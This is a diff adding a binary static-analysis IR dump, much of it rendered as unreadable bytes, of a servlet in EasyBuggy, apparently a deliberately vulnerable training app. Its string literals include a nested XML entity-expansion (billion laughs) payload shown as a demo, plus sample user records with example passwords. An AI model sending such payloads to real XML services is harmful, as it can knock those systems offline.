@@ -1,0 +1,1561 @@
+
+ëorg.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet#doGet(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)Vò
+ç/home/ubuntu/repos/devsecops-jenkins-k8s-tf-sast-sonarcloud-repo/src/main/java/org/t246osslab/easybuggy/vulnerabilities/XEEandXXEServlet.java, ,("startingBlock*“î
+2P P(ñì
+P P(>
+%50java.lang.String"yorg.t246osslab.easybuggy.core.servlets.AbstractServlet#getInfoMsg(Ljava/lang/String;Ljava/util/Locale;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*,
+
+__unknown_file (
+msg.note.xee*8
+
+__unknown_file (
+
+localejava.util.Locale20getInfoMsg(Ljava/lang/String;Ljava/util/Locale;)êç
+P P(?
+%51java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%50java.lang.String2append(Ljava/lang/String;)´®
+Q Q(O
+%52java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*P
+
+__unknown_file (42
+0<pre id=\"code\" class=\"prettyprint lang-xml\">2append(Ljava/lang/String;)›⁄
+R R(X
+%53java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*K
+
+__unknown_file (/-
++<?xml version=\"1.0\" encoding=\"UTF-8\" ?>2!encodeForHTML(Ljava/lang/String;)l
+j
+R R(a
+%54java.lang.String"__concat*%
+R R(X
+
+%53java.lang.String*
+R[ R(a
+<br>êç
+R R(b
+%55java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%54java.lang.String2append(Ljava/lang/String;)æª
+S S(9
+%56java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*,
+
+__unknown_file (
+<!DOCTYPE s[2!encodeForHTML(Ljava/lang/String;)l
+j
+S S(B
+%57java.lang.String"__concat*%
+S S(9
+
+%56java.lang.String*
+S< S(B
+<br>êç
+S S(C
+%58java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%57java.lang.String2append(Ljava/lang/String;)∆√
+T T(A
+%59java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*4
+
+__unknown_file (
+<!ENTITY x0 \"ha!\">2!encodeForHTML(Ljava/lang/String;)l
+j
+T T(J
+%60java.lang.String"__concat*%
+T T(A
+
+%59java.lang.String*
+TD T(J
+<br>êç
+T T(K
+%61java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%60java.lang.String2append(Ljava/lang/String;)À»
+U U(F
+%62java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*9
+
+__unknown_file (
+<!ENTITY x1 \"&x0;&x0;\">2!encodeForHTML(Ljava/lang/String;)l
+j
+U U(O
+%63java.lang.String"__concat*%
+U U(F
+
+%62java.lang.String*
+UI U(O
+<br>êç
+U U(P
+%64java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%63java.lang.String2append(Ljava/lang/String;)À»
+V V(F
+%65java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*9
+
+__unknown_file (
+<!ENTITY x2 \"&x1;&x1;\">2!encodeForHTML(Ljava/lang/String;)l
+j
+V V(O
+%66java.lang.String"__concat*%
+V V(F
+
+%65java.lang.String*
+VI V(O
+<br>êç
+V V(P
+%67java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%66java.lang.String2append(Ljava/lang/String;)Ã…
+W W(G
+%68java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*:
+
+__unknown_file (
+<!ENTITY x3 \"&x2;&x2;)\">2!encodeForHTML(Ljava/lang/String;)l
+j
+W W(P
+%69java.lang.String"__concat*%
+W W(G
+
+%68java.lang.String*
+WJ W(P
+<br>êç
+W W(Q
+%70java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%69java.lang.String2append(Ljava/lang/String;)’“
+X X(P
+%71java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*C
+
+__unknown_file ('%
+#<!-- Entities from x4 to x98... -->2!encodeForHTML(Ljava/lang/String;)l
+j
+X X(Y
+%72java.lang.String"__concat*%
+X X(P
+
+%71java.lang.String*
+XS X(Y
+<br>êç
+X X(Z
+%73java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%72java.lang.String2append(Ljava/lang/String;)ŒÀ
+Y Y(I
+%74java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*<
+
+__unknown_file ( 
+<!ENTITY x99 \"&x98;&x98;\">2!encodeForHTML(Ljava/lang/String;)l
+j
+Y Y(R
+%75java.lang.String"__concat*%
+Y Y(I
+
+%74java.lang.String*
+YL Y(R
+<br>êç
+Y Y(S
+%76java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%75java.lang.String2append(Ljava/lang/String;)œÃ
+Z Z(J
+%77java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*=
+
+__unknown_file (!
+<!ENTITY x100 \"&x99;&x99;\">2!encodeForHTML(Ljava/lang/String;)l
+j
+Z Z(S
+%78java.lang.String"__concat*%
+Z Z(J
+
+%77java.lang.String*
+ZM Z(S
+<br>êç
+Z Z(T
+%79java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%78java.lang.String2append(Ljava/lang/String;)¥±
+[ [(/
+%80java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*"
+
+__unknown_file (
+]>2!encodeForHTML(Ljava/lang/String;)l
+j
+[ [(8
+%81java.lang.String"__concat*%
+[ [(/
+
+%80java.lang.String*
+[2 [(8
+<br>êç
+[ [(9
+%82java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%81java.lang.String2append(Ljava/lang/String;)ÏÈ
+\ \(g
+%83java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*Z
+
+__unknown_file (><
+:<soapenv:Envelope xmlns:soapenv=\"...\" xmlns:ns1=\"...\">2!encodeForHTML(Ljava/lang/String;)l
+j
+\ \(o
+%84java.lang.String"__concat*%
+\ \(g
+
+%83java.lang.String*
+\i \(o
+<br>êç
+\ \(p
+%85java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%84java.lang.String2append(Ljava/lang/String;)e
+c
+] ](
+%86java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;¬ø
+]" ](C
+%87java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*0
+
+__unknown_file (
+<soapenv:Header>2!encodeForHTML(Ljava/lang/String;)}
+{
+] ](C
+%88java.lang.String"__concat*%
+] ](
+
+%86java.lang.String*%
+]" ](C
+
+%87java.lang.Stringl
+j
+] ](L
+%89java.lang.String"__concat*%
+] ](C
+
+%88java.lang.String*
+]F ](L
+<br>êç
+] ](M
+%90java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%89java.lang.String2append(Ljava/lang/String;)e
+c
+^ ^(
+%91java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;√¿
+^" ^(D
+%92java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*1
+
+__unknown_file (
+</soapenv:Header>2!encodeForHTML(Ljava/lang/String;)}
+{
+^ ^(D
+%93java.lang.String"__concat*%
+^ ^(
+
+%91java.lang.String*%
+^" ^(D
+
+%92java.lang.Stringl
+j
+^ ^(M
+%94java.lang.String"__concat*%
+^ ^(D
+
+%93java.lang.String*
+^G ^(M
+<br>êç
+^ ^(N
+%95java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%94java.lang.String2append(Ljava/lang/String;)e
+c
+_ _(
+%96java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;¿Ω
+_" _(A
+%97java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*.
+
+__unknown_file (
+<soapenv:Body>2!encodeForHTML(Ljava/lang/String;)}
+{
+_ _(A
+%98java.lang.String"__concat*%
+_ _(
+
+%96java.lang.String*%
+_" _(A
+
+%97java.lang.Stringl
+j
+_ _(J
+%99java.lang.String"__concat*%
+_ _(A
+
+%98java.lang.String*
+_D _(J
+<br>ëé
+_ _(K
+%100java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%99java.lang.String2append(Ljava/lang/String;)f
+d
+` `(
+%101java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;f
+d
+`" `(%
+%102java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;Ä
+~
+` `(%
+%103java.lang.String"__concat*&
+` `(
+
+%101java.lang.String*&
+`" `(%
+
+%102java.lang.String¿Ω
+`( `(F
+%104java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*-
+
+__unknown_file (
+<ns1:reverse>2!encodeForHTML(Ljava/lang/String;)Ä
+~
+` `(F
+%105java.lang.String"__concat*&
+` `(%
+
+%103java.lang.String*&
+`( `(F
+
+%104java.lang.Stringn
+l
+` `(O
+%106java.lang.String"__concat*&
+` `(F
+
+%105java.lang.String*
+`I `(O
+<br>íè
+` `(P
+%107java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%106java.lang.String2append(Ljava/lang/String;)f
+d
+a a(
+%108java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;f
+d
+a" a(%
+%109java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;Ä
+~
+a a(%
+%110java.lang.String"__concat*&
+a a(
+
+%108java.lang.String*&
+a" a(%
+
+%109java.lang.Stringf
+d
+a( a(+
+%111java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;Ä
+~
+a a(+
+%112java.lang.String"__concat*&
+a a(%
+
+%110java.lang.String*&
+a( a(+
+
+%111java.lang.String¿Ω
+a. a(L
+%113java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*-
+
+__unknown_file (
+<s>&x100;</s>2!encodeForHTML(Ljava/lang/String;)Ä
+~
+a a(L
+%114java.lang.String"__concat*&
+a a(+
+
+%112java.lang.String*&
+a. a(L
+
+%113java.lang.Stringn
+l
+a a(U
+%115java.lang.String"__concat*&
+a a(L
+
+%114java.lang.String*
+aO a(U
+<br>íè
+a a(V
+%116java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%115java.lang.String2append(Ljava/lang/String;)f
+d
+b b(
+%117java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;f
+d
+b" b(%
+%118java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;Ä
+~
+b b(%
+%119java.lang.String"__concat*&
+b b(
+
+%117java.lang.String*&
+b" b(%
+
+%118java.lang.String¡æ
+b( b(G
+%120java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*.
+
+__unknown_file (
+</ns1:reverse>2!encodeForHTML(Ljava/lang/String;)Ä
+~
+b b(G
+%121java.lang.String"__concat*&
+b b(%
+
+%119java.lang.String*&
+b( b(G
+
+%120java.lang.Stringn
+l
+b b(P
+%122java.lang.String"__concat*&
+b b(G
+
+%121java.lang.String*
+bJ b(P
+<br>íè
+b b(Q
+%123java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%122java.lang.String2append(Ljava/lang/String;)f
+d
+c c(
+%124java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;¬ø
+c" c(B
+%125java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*/
+
+__unknown_file (
+</soapenv:Body>2!encodeForHTML(Ljava/lang/String;)Ä
+~
+c c(B
+%126java.lang.String"__concat*&
+c c(
+
+%124java.lang.String*&
+c" c(B
+
+%125java.lang.Stringn
+l
+c c(K
+%127java.lang.String"__concat*&
+c c(B
+
+%126java.lang.String*
+cE c(K
+<br>íè
+c c(L
+%128java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%127java.lang.String2append(Ljava/lang/String;)∆√
+d d(@
+%129java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*3
+
+__unknown_file (
+</soapenv:Envelope>2!encodeForHTML(Ljava/lang/String;)n
+l
+d d(I
+%130java.lang.String"__concat*&
+d d(@
+
+%129java.lang.String*
+dC d(I
+<br>íè
+d d(J
+%131java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%130java.lang.String2append(Ljava/lang/String;)Çˇ
+e e(%
+%132java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*&
+
+__unknown_file (
+
+</pre>2append(Ljava/lang/String;)ÉÄ
+f f(&
+%133java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*'
+
+__unknown_file (	
+</form>2append(Ljava/lang/String;)ëé
+g' g(G
+%134java.lang.String"uorg.t246osslab.easybuggy.core.servlets.AbstractServlet#getMsg(Ljava/lang/String;Ljava/util/Locale;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*.
+
+__unknown_file (
+title.xee.page*8
+
+__unknown_file (
+
+localejava.util.Locale2,getMsg(Ljava/lang/String;Ljava/util/Locale;)¨©
+gI g(\
+%135java.lang.String"4java.lang.StringBuilder#toString()Ljava/lang/String;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder2
+toString()«ƒ
+g g(]
+%136void"Ωorg.t246osslab.easybuggy.core.servlets.AbstractServlet#responseToClient(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;Ljava/lang/String;Ljava/lang/String;)V*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*J
+
+__unknown_file (.
+,
+req%javax.servlet.http.HttpServletRequest*K
+
+__unknown_file (/
+-
+res&javax.servlet.http.HttpServletResponse*6
+
+__unknown_file (
+
+%134java.lang.String*6
+
+__unknown_file (
+
+%135java.lang.String2ÖresponseToClient(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;Ljava/lang/String;Ljava/lang/String;)*
+0*≠
+3O O(ŒÀ
+O O(.
+%48java.lang.String"Hjavax.servlet.http.HttpServletRequest#getServletPath()Ljava/lang/String;*J
+
+__unknown_file (.
+,
+req%javax.servlet.http.HttpServletRequest2getServletPath()ƒ¡
+O O(/
+%49boolean",java.lang.String#equals(Ljava/lang/Object;)Z*$
+
+__unknown_file (
+/xee*5
+
+__unknown_file (
+
+%48java.lang.String2equals(Ljava/lang/Object;)*
+2
+1*»
+startingBlock, ,(I°
+û
++ +(
+%166"
+__annotate*2
+
+__unknown_file (
+java.lang.Override*J
+
+__unknown_file (.
+,
+req%javax.servlet.http.HttpServletRequestn
+l
+,, ,(/,
+req%javax.servlet.http.HttpServletRequest"__annotation*$
+
+__unknown_file (
+
+%166¢
+ü
++ +(
+%167"
+__annotate*2
+
+__unknown_file (
+java.lang.Override*K
+
+__unknown_file (/
+-
+res&javax.servlet.http.HttpServletResponseo
+m
+,E ,(H-
+res&javax.servlet.http.HttpServletResponse"__annotation*$
+
+__unknown_file (
+
+%167*
+8*¥
+4M M(å
+â
+M M(<
+%46java.lang.Object"__mapGet*,
+
+__unknown_file (
+
+%jsp_context*,
+
+__unknown_file (
+errorMessageêç
+M M(=
+%47java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/Object;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%46java.lang.Object2append(Ljava/lang/Object;)*
+3*™D
+58 8(ÉÄ
+8 8(#
+%11java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*(
+
+__unknown_file (
+
+<br><br>2append(Ljava/lang/String;)´®
+9 9(K
+%12java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*P
+
+__unknown_file (42
+0<pre id=\"code\" class=\"prettyprint lang-xml\">2append(Ljava/lang/String;)…∆
+: :(@
+%13java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*7
+
+__unknown_file (
+<?xml version=\"1.0\"?>2!encodeForHTML(Ljava/lang/String;)l
+j
+: :(I
+%14java.lang.String"__concat*%
+: :(@
+
+%13java.lang.String*
+:C :(I
+<br>êç
+: :(J
+%15java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%14java.lang.String2append(Ljava/lang/String;)π∂
+; ;(0
+%16java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*'
+
+__unknown_file (	
+<users>2!encodeForHTML(Ljava/lang/String;)l
+j
+; ;(9
+%17java.lang.String"__concat*%
+; ;(0
+
+%16java.lang.String*
+;3 ;(9
+<br>êç
+; ;(:
+%18java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%17java.lang.String2append(Ljava/lang/String;)e
+c
+< <(
+%19java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;êç
+< <(
+%20java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%19java.lang.String2append(Ljava/lang/String;)√
+¿
+=& >(G
+%21java.lang.String"__concat*J
+=& =(b><
+:<user uid=\"user11\" name=\"Tommy\" password=\"pasworld\" *E
+> >(G97
+5phone=\"090-1004-5678\" mail=\"user11@example.com\"/>«ƒ
+= >(H
+%22java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*5
+
+__unknown_file (
+
+%21java.lang.String2!encodeForHTML(Ljava/lang/String;)êç
+= >(I
+%23java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%22java.lang.String2append(Ljava/lang/String;)ˇ¸
+? ?(
+%24java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*$
+
+__unknown_file (
+<br>2append(Ljava/lang/String;)e
+c
+@ @(
+%25java.lang.String"__id*8
+
+__unknown_file (
+&nbsp;&nbsp;&nbsp;&nbsp;êç
+@ @(
+%26java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%25java.lang.String2append(Ljava/lang/String;)¬
+ø
+A& B(G
+%27java.lang.String"__concat*I
+A& A(a=;
+9<user uid=\"user12\" name=\"Matt\" password=\"PaSsWoRd\" *E
+B B(G97
+5phone=\"090-9984-1118\" mail=\"user12@example.com\"/>«ƒ
+A B(H
+%28java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*5
+
+__unknown_file (
+
+%27java.lang.String2!encodeForHTML(Ljava/lang/String;)êç
+A B(I
+%29java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%28java.lang.String2append(Ljava/lang/String;)ˇ¸
+C C(
+%30java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*$
+
+__unknown_file (
+<br>2append(Ljava/lang/String;)∫∑
+D D(1
+%31java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*(
+
+__unknown_file (
+
+</users>2!encodeForHTML(Ljava/lang/String;)êç
+D D(2
+%32java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%31java.lang.String2append(Ljava/lang/String;)Å˛
+E E(!
+%33java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*&
+
+__unknown_file (
+
+</pre>2append(Ljava/lang/String;)ˇ¸
+F F(
+%34java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*$
+
+__unknown_file (
+<br>2append(Ljava/lang/String;)∞≠
+G G(P
+%35java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*U
+
+__unknown_file (97
+5<input type=\"file\" name=\"file\" size=\"60\" /><br>2append(Ljava/lang/String;)òï
+H H(@
+%36java.lang.String"uorg.t246osslab.easybuggy.core.servlets.AbstractServlet#getMsg(Ljava/lang/String;Ljava/util/Locale;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*6
+
+__unknown_file (
+msg.select.upload.file*8
+
+__unknown_file (
+
+localejava.util.Locale2,getMsg(Ljava/lang/String;Ljava/util/Locale;)êç
+H H(A
+%37java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%36java.lang.String2append(Ljava/lang/String;)ÉÄ
+I I(#
